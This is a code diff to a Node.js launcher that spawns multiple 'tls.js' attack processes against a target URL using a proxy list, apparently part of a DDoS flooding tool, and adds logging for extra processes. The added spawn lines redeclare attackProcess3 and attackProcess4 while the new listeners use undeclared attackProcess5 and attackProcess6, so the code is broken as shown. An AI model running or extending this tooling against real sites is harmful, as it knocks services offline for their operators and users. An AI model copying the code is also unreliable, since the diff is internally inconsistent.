@@ -158,6 +158,8 @@ async function main() {
     const attackProcess2 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
     const attackProcess3 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
     const attackProcess4 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
+    const attackProcess3 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
+    const attackProcess4 = spawn('node', ['tls.js', url, time, threads, 'prx.txt']);
     
     // Attach event listeners for each process
     attackProcess1.stdout.on('data', (data) => {
@@ -199,6 +201,27 @@ async function main() {
     });
     attackProcess4.on('exit', (code) => {
         console.log(`\x1b[1;32m[INFO - Process 4]\x1b[0m Attack process exited with code ${code}`);
+    });
+
+    attackProcess5.stdout.on('data', (data) => {
+        console.log(`\x1b[1;36m[SYSTEM - Process5]\x1b[0m ${data.toString().trim()}`);
+    });
+    attackProcess5.stderr.on('data', (data) => {
+        console.error(`\x1b[1;31m[ERROR - Process 5]\x1b[0m ${data.toString().trim()}`);
+    });
+    attackProcess5.on('exit', (code) => {
+        console.log(`\x1b[1;32m[INFO - Process 5]\x1b[0m Attack process exited with code ${code}`);
+    });
+    
+
+    attackProcess6.stdout.on('data', (data) => {
+        console.log(`\x1b[1;36m[SYSTEM - Process6]\x1b[0m ${data.toString().trim()}`);
+    });
+    attackProcess6.stderr.on('data', (data) => {
+        console.error(`\x1b[1;31m[ERROR - Process 6]\x1b[0m ${data.toString().trim()}`);
+    });
+    attackProcess6.on('exit', (code) => {
+        console.log(`\x1b[1;32m[INFO - Process 6]\x1b[0m Attack process exited with code ${code}`);
     });
 
 
